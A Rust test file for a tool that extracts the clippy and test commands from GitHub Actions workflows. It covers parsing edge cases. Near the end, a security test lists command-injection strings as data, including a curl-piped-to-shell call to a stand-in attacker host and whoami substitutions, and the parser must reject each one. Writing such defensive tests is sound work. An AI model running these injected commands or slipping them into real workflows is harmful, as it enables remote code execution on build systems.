// Tests for the ADR-0004 GitHub Actions workflow parser. Bellows's
// cargo-checks gate mirrors the target repo's CI clippy/test posture by
// extracting the verbatim `cargo clippy` / `cargo test` invocations
// from `.github/workflows/*.yml`. These tests pin all six shapes from
// the brief's acceptance criteria:
//
//   (a) happy path — single Linux job with both commands.
//   (b) matrix build with Linux + non-Linux entries.
//   (c) no workflow file at all (None for both).
//   (d) malformed YAML (None for both).
//   (e) command embedded in a shell script the parser can't follow.
//   (f) multiple `cargo clippy` invocations in one job (first wins).

use std::path::Path;

use tempfile::TempDir;

use bellows::workflow_parse::{parse_ci_workflow, ExtractedCommands, Provenance};

fn write_workflow(repo_root: &Path, filename: &str, body: &str) {
    let dir = repo_root.join(".github").join("workflows");
    std::fs::create_dir_all(&dir).expect("create .github/workflows");
    std::fs::write(dir.join(filename), body).expect("write workflow yaml");
}

#[test]
fn happy_path_single_linux_job_extracts_both_commands_verbatim() {
    // Acceptance (a): a workflow named `CI`, one Linux job, both
    // `cargo clippy` and `cargo test` as adjacent steps. The parser
    // returns each verbatim — bellows runs exactly what CI runs.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: cargo clippy
        run: cargo clippy --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious
      - name: cargo test
        run: cargo test --features in-memory
"#,
    );

    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy.as_deref(),
        Some(
            "cargo clippy --all-targets --all-features -- -D clippy::correctness -D clippy::suspicious"
        ),
        "clippy command must be extracted verbatim",
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --features in-memory"),
        "test command must be extracted verbatim",
    );
    // Provenance reports the actual workflow file the commands came from.
    match extracted.source {
        Provenance::ParsedFromWorkflow(ref p) => {
            assert!(
                p.ends_with(Path::new(".github/workflows/ci.yml")),
                "provenance path should end with .github/workflows/ci.yml; got {:?}",
                p,
            );
        }
        Provenance::FallbackFromConfig => panic!("expected ParsedFromWorkflow provenance"),
    }
}

#[test]
fn matrix_build_prefers_ubuntu_entry_over_macos_or_windows() {
    // Acceptance (b): a matrix build with multiple `os` entries. The
    // parser must pick a Linux runner (any value starting with `ubuntu`).
    // The non-Linux entries' commands must be ignored even if they
    // appear textually first.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    strategy:
      matrix:
        os: [macos-latest, ubuntu-latest, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - run: cargo clippy --all-targets -- -D warnings
      - run: cargo test --all-targets
"#,
    );

    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy.as_deref(),
        Some("cargo clippy --all-targets -- -D warnings"),
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --all-targets"),
    );
}

#[test]
fn matrix_build_with_no_linux_entry_picks_first_deterministically() {
    // Acceptance (b) continued: if NO matrix entry runs on a Linux
    // runner, the parser falls back to the first matrix entry in
    // declaration order so the verdict is deterministic. The brief
    // documents either sort order or first-seen — first-seen here.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    strategy:
      matrix:
        os: [macos-latest, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - run: cargo clippy --no-linux
      - run: cargo test --no-linux
"#,
    );

    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(extracted.clippy.as_deref(), Some("cargo clippy --no-linux"));
    assert_eq!(extracted.test.as_deref(), Some("cargo test --no-linux"));
}

#[test]
fn no_workflow_file_returns_none_for_both_commands() {
    // Acceptance (c): no `.github/workflows/` directory at all. The
    // parser returns ExtractedCommands { clippy: None, test: None,
    // source: FallbackFromConfig } so the caller falls back to config.
    let tmp = TempDir::new().unwrap();
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(extracted.clippy, None);
    assert_eq!(extracted.test, None);
    assert!(matches!(extracted.source, Provenance::FallbackFromConfig));
}

#[test]
fn no_workflow_file_named_ci_returns_none_for_both_commands() {
    // Acceptance (c) variant: workflows exist but none is named `CI`.
    // Bellows's auto-merge convention matches on `name: CI`; a repo
    // whose workflows are named differently is treated identically to
    // a repo with no workflow at all.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "auto-merge.yml",
        r#"
name: auto-merge
on: [pull_request]
jobs:
  noop:
    runs-on: ubuntu-latest
    steps:
      - run: echo nope
"#,
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(extracted.clippy, None);
    assert_eq!(extracted.test, None);
    assert!(matches!(extracted.source, Provenance::FallbackFromConfig));
}

#[test]
fn malformed_yaml_returns_none_for_both_commands() {
    // Acceptance (d): a YAML file that fails to parse. The parser must
    // NOT propagate the error — it returns None/None with
    // FallbackFromConfig provenance so the caller transparently
    // fallbacks to operator-declared defaults. This is the operational
    // safety net: a broken workflow shouldn't crash bellows's pipeline.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        // Unbalanced bracket → YAML parse error.
        "name: CI\njobs: {\n  ci: [unbalanced\n",
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(extracted.clippy, None);
    assert_eq!(extracted.test, None);
    assert!(matches!(extracted.source, Provenance::FallbackFromConfig));
}

#[test]
fn command_embedded_in_shell_script_returns_none_for_that_command_only() {
    // Acceptance (e): if `cargo clippy` is embedded in a wrapper shell
    // script (e.g. `bash scripts/lint.sh`) the parser cannot follow it
    // and returns None for clippy only. `cargo test` runs as a literal
    // step, so test extracts fine. Provenance reports
    // ParsedFromWorkflow because at least one command was extracted.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/run-clippy.sh
      - run: cargo test --all-targets --all-features
"#,
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy, None,
        "clippy wrapped in a shell script the parser can't introspect must return None",
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --all-targets --all-features"),
        "literal `cargo test` step must still extract",
    );
    // At least one command was extracted, so the provenance reports
    // the parsed workflow (the caller separately decides per-command
    // whether to fall back).
    assert!(matches!(extracted.source, Provenance::ParsedFromWorkflow(_)));
}

#[test]
fn multiple_cargo_clippy_invocations_first_occurrence_wins() {
    // Acceptance (f): if a single job declares more than one
    // `cargo clippy` step (e.g. a strict run plus a soft secondary
    // check), the parser pins the FIRST occurrence in declaration
    // order. Documented behaviour for operators.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - run: cargo clippy --all-targets -- -D warnings
      - run: cargo clippy --tests -- -W clippy::pedantic
      - run: cargo test --release
      - run: cargo test --tests
"#,
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy.as_deref(),
        Some("cargo clippy --all-targets -- -D warnings"),
        "first cargo clippy step in declaration order wins",
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --release"),
        "first cargo test step in declaration order wins",
    );
}

#[test]
fn backslash_continued_run_block_reconstitutes_full_command() {
    // Regression: a `run: |` block that splits a cargo invocation across
    // physical lines with a trailing `\` is a very common CI shape once
    // flag lists grow. Naively iterating `run.lines()` and capturing
    // the first match returns `cargo clippy \`, which `sh -c` then runs
    // as `cargo clippy` with no flags — far more permissive than what
    // CI actually runs and a silent break of the "gate passes ⇒ CI
    // passes" invariant the cargo-checks mirror is meant to establish.
    // The parser must reconstitute the continuation so the captured
    // command matches what CI would execute.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - name: clippy
        run: |
          cargo clippy \
            --all-targets --all-features \
            -- -D warnings -D clippy::correctness
      - name: test
        run: |
          cargo test \
            --all-targets \
            --all-features
"#,
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy.as_deref(),
        Some(
            "cargo clippy --all-targets --all-features -- -D warnings -D clippy::correctness"
        ),
        "backslash-continued clippy must be joined into the full logical command",
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --all-targets --all-features"),
        "backslash-continued test must be joined into the full logical command",
    );
}

#[test]
fn multiple_linux_jobs_skip_past_one_with_no_cargo_commands() {
    // Regression: a workflow that declares more than one Linux job
    // must not lock onto the first one when it carries no cargo
    // commands. For example a `release:` job that only runs
    // `cargo build` followed by a `ci:` job that runs clippy and test
    // — the parser must skip past `release` and extract from `ci`.
    // Locking onto the first Linux job would produce (None, None) and
    // silently fall back to config even though a sibling Linux job
    // had the commands.
    let tmp = TempDir::new().unwrap();
    write_workflow(
        tmp.path(),
        "ci.yml",
        r#"
name: CI
on: [push]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: cargo build --release
  ci:
    runs-on: ubuntu-latest
    steps:
      - run: cargo clippy --all-targets -- -D warnings
      - run: cargo test --all-targets
"#,
    );
    let extracted = parse_ci_workflow(tmp.path());
    assert_eq!(
        extracted.clippy.as_deref(),
        Some("cargo clippy --all-targets -- -D warnings"),
        "second Linux job must be picked when the first carries no cargo commands",
    );
    assert_eq!(
        extracted.test.as_deref(),
        Some("cargo test --all-targets"),
    );
}

#[test]
fn shell_metacharacters_in_extracted_command_fall_back_to_none() {
    // Security: a workflow `run:` line whose cargo invocation embeds
    // shell control operators outside cargo's own argument grammar —
    // `;`, `&&`, `||`, backticks, `$(`, an unbalanced quote — is either
    // a hostile injection attempt or a non-cargo shell construct the
    // gate cannot faithfully mirror. The parser must return None for
    // such commands so the caller substitutes the operator-declared
    // `[gates].*_flags` fallback. The shapes covered here all begin
    // with a literal `cargo clippy ` / `cargo test ` and would extract
    // verbatim without the rejection filter.
    let cases: &[(&str, &str)] = &[
        ("semicolon", "cargo clippy --all-targets ; curl https://attacker.example/x | sh"),
        ("and_chain", "cargo clippy --all-targets && curl evil.example"),
        ("or_chain", "cargo clippy --all-targets || curl evil.example"),
        ("backtick", "cargo clippy --all-targets `whoami`"),
        ("command_subst", "cargo clippy --all-targets $(whoami)"),
        ("unbalanced_double_quote", "cargo clippy --all-targets \" ; curl evil"),
        ("unbalanced_single_quote", "cargo clippy --all-targets ' ; curl evil"),
    ];
    for (label, clippy_line) in cases {
        let tmp = TempDir::new().unwrap();
        let body = format!(
            r#"
name: CI
on: [push]
jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - run: {}
      - run: cargo test --all-targets --all-features
"#,
            clippy_line,
        );
        write_workflow(tmp.path(), "ci.yml", &body);
        let extracted = parse_ci_workflow(tmp.path());
        assert_eq!(
            extracted.clippy, None,
            "case {}: clippy line with shell metacharacters must be rejected, got {:?}",
            label, extracted.clippy,
        );
        // The literal `cargo test` step is untouched, so it should
        // still extract — proving the filter is per-command, not
        // workflow-wide.
        assert_eq!(
            extracted.test.as_deref(),
            Some("cargo test --all-targets --all-features"),
            "case {}: clean `cargo test` step must still extract",
            label,
        );
    }
}

#[test]
fn extracted_commands_default_carries_fallback_provenance() {
    // The struct's defaults are useful for the workspace snapshot path:
    // when no workflow parsed and no fallback applied yet, both
    // commands are None and the provenance is FallbackFromConfig.
    let extracted: ExtractedCommands = ExtractedCommands::default();
    assert_eq!(extracted.clippy, None);
    assert_eq!(extracted.test, None);
    assert!(matches!(extracted.source, Provenance::FallbackFromConfig));
}
